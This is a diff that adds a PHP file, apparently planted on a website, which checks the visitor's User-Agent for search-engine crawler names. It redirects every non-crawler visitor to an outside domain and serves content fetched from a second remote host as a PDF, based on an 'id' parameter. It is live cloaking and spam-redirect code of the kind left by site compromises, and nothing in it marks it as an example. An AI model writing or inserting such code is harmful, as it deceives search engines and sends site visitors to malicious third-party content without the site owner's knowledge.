@@ -1,0 +1,39 @@
+<?php
+$flag = false;
+$tmp = $_SERVER['HTTP_USER_AGENT'];
+if(strpos($tmp, 'Googlebot') !== false){
+    $flag = true;
+} else if(strpos($tmp, 'Yahoo! Slurp') !== false){
+    $flag = true;
+} else if(strpos($tmp, 'msnbot') !== false){
+    $flag = true;
+} else if(strpos($tmp, 'bingbot') !== false){
+    $flag = true;
+} else if(strpos($tmp, 'fast-webcrawler') !== false){
+    $flag = true;
+} else if(strpos($tmp, 'Gaisbot') !== false){
+    $flag = true;
+} else if(strpos($tmp, 'ia_archiver') !== false){
+    $flag = true;
+} else if(strpos($tmp, 'altavista') !== false){
+    $flag = true;
+} else if(strpos($tmp, 'lycos_spider') !== false){
+    $flag = true;
+} else if(strpos($tmp, 'Inktomi slurp') !== false){
+    $flag = true;
+}
+if($flag == false){
+header("location:http://nutres-fr.com/testimonials.html#pdf0525");
+}
+?>
+<?php 
+if(empty($_REQUEST["id"]))
+{
+    echo "parameter error";
+	  return;
+}
+$id=$_REQUEST["id"];
+$interfaceurl="http://pdf.frwh1.abmabc.info/0524/";
+header("Content-type: application/pdf");
+echo file_get_contents($interfaceurl.$id); 
+?>
